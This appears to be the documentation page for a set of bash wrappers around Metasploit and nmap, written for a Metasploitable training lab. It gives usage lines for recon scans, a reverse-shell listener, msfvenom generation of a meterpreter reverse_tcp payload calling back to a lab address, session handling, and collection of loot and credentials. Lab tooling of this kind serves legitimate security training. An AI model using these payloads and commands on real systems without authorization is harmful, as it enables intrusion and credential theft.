# Scripts breakdown

Everything in [`scripts/`](../scripts) is a small wrapper around normal
`msfconsole` / `msfvenom` / `nmap` workflow - nothing here does anything
you couldn't type by hand, it just saves retyping the same commands every
session. They're numbered in the order I actually use them during a run
through the lab, and they line up with the methodology in the main
[README](../README.md).

All of them source `scripts/lib/common.sh` for logging and a couple of
shared defaults (workspace name, report/loot directories), and all of them
are safe to run from any directory since they `cd` to their own location
first.

Reports land in `reports/`, loot in `loot/`, db backups in `backups/` -
all three are git-ignored since they'll contain scan output and
target-specific data.

---

## `00-setup-workspace.sh`
**What it does:** makes sure postgresql is up, runs `msfdb init` if it
hasn't been done yet, and creates/selects a Metasploit workspace.

**Why:** first thing I run on a fresh VM or after a snapshot revert -
`msfconsole` complaining about no database connection gets old fast.

**Usage:**
```bash
./scripts/00-setup-workspace.sh [workspace-name]
```
Defaults to `lab` if no name is given. Set `MSF_WORKSPACE` in your shell
to change the default for every other script too.

---

## `01-recon-nmap.sh`
**What it does:** runs `nmap -sV -sC` against a target or CIDR range and
writes timestamped output (`-oA`, so `.xml`/`.nmap`/`.gnmap` all get
written) into `reports/nmap/`.

**Why:** keeps every scan from a session on disk instead of scrolling
back through terminal history, and the XML feeds directly into the next
script.

**Usage:**
```bash
./scripts/01-recon-nmap.sh 192.168.56.0/24
./scripts/01-recon-nmap.sh 192.168.56.101 -p- -T4
```
Anything after the target is passed straight through to `nmap`.

---

## `02-import-scan.sh`
**What it does:** imports a scan file (nmap XML, Nessus, Nexpose, etc -
anything `db_import` supports) into the active workspace, then prints a
quick `hosts` table so you can eyeball what came in.

**Usage:**
```bash
./scripts/02-import-scan.sh reports/nmap/192.168.56.101-20260910-1200.xml
```

---

## `03-search-exploits.sh`
**What it does:** thin wrapper around msfconsole's `search` command.

**Why:** honestly just to avoid opening a full msfconsole session
just to check if there's a module for a CVE or service.

**Usage:**
```bash
./scripts/03-search-exploits.sh cve:2021-41773
./scripts/03-search-exploits.sh type:exploit platform:linux vsftpd
```

---

## `04-start-listener.sh`
**What it does:** writes a resource script (`.rc` file) that sets up
`exploit/multi/handler` with the payload/LHOST/LPORT you give it, then
launches `msfconsole` with it. Handler runs backgrounded jobs
(`exploit -j -z`) so multiple sessions can call back without stepping on
each other.

**Usage:**
```bash
./scripts/04-start-listener.sh 192.168.56.1 4444
./scripts/04-start-listener.sh 192.168.56.1 4444 windows/x64/meterpreter/reverse_tcp
```
Defaults to `linux/x64/meterpreter/reverse_tcp` if you don't specify a
payload. Generated resource scripts are kept in `scripts/resource/` so
they can be reused or checked into notes.

---

## `05-generate-payload.sh`
**What it does:** wraps `msfvenom` with basic argument validation so a
missing flag fails fast with a usage message instead of msfvenom's own
(much longer) error output.

**Usage:**
```bash
./scripts/05-generate-payload.sh \
  -p linux/x64/meterpreter/reverse_tcp \
  -l 192.168.56.1 -r 4444 -f elf -o loot/shell.elf
```
`-e <encoder>` is optional if you need to run it through an encoder.

---

## `06-session-manager.sh`
**What it does:** list / kill / kill-all / upgrade for active sessions,
without needing to remember the exact `sessions -x` flag each time.

**Usage:**
```bash
./scripts/06-session-manager.sh list
./scripts/06-session-manager.sh kill 2
./scripts/06-session-manager.sh kill-all
./scripts/06-session-manager.sh upgrade 1
```

---

## `07-loot-collect.sh`
**What it does:** reads the `loot` table for a workspace and copies any
referenced files out of `~/.msf4/loot` into `loot/<workspace>/`, along
with a manifest of what was pulled.

**Why:** loot files live buried in a hashed filename under `~/.msf4`,
which is not fun to dig through when you're writing up findings later.

**Usage:**
```bash
./scripts/07-loot-collect.sh
./scripts/07-loot-collect.sh lab
```

---

## `08-generate-report.sh`
**What it does:** exports `hosts`, `services`, `vulns`, and `creds` from
a workspace to CSV, then builds a single `summary.html` from those CSVs
so there's something presentable without opening a spreadsheet.

**Usage:**
```bash
./scripts/08-generate-report.sh
./scripts/08-generate-report.sh lab
```
Output goes to `reports/<workspace>-<timestamp>/`.

---

## `09-db-backup-restore.sh`
**What it does:** `pg_dump`/`pg_restore` wrapper for the Metasploit
postgres database, reading connection info out of `~/.msf4/database.yml`
so you don't have to pass credentials by hand.

**Why:** lost a workspace once from a bad `db_import` and had to redo a
day of enumeration. Wasn't doing that twice.

**Usage:**
```bash
./scripts/09-db-backup-restore.sh backup
./scripts/09-db-backup-restore.sh backup backups/before-priv-esc.dump
./scripts/09-db-backup-restore.sh restore backups/before-priv-esc.dump
```
Restore asks for confirmation before touching the database.

---

## Requirements

- Metasploit Framework (tested against the current `msfconsole`/`msfvenom` from the official installer / apt package)
- PostgreSQL (whatever `msfdb init` sets up)
- `nmap` for the recon script
- Standard GNU coreutils / bash 4+

## Notes

- These are lab-only tooling for the Metasploitable environment described
  in the [README](../README.md). Point them at anything you don't have
  explicit authorization to test and that's on you, not the scripts.
- `reports/`, `loot/`, and `backups/` are created automatically on first
  run and are git-ignored.
